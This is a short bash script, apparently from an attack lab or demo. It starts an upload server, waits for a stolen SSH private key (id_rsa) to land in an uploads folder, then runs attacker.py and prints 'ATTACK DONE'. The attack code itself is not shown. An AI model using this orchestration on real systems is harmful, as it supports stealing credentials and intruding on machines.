#!/bin/bash

python /upload_server.py &
while [ ! -f /root/Downloads/uploads/id_rsa ]
do
  sleep 2
done
python attacker.py
echo "ATTACK DONE"
sleep 10m;
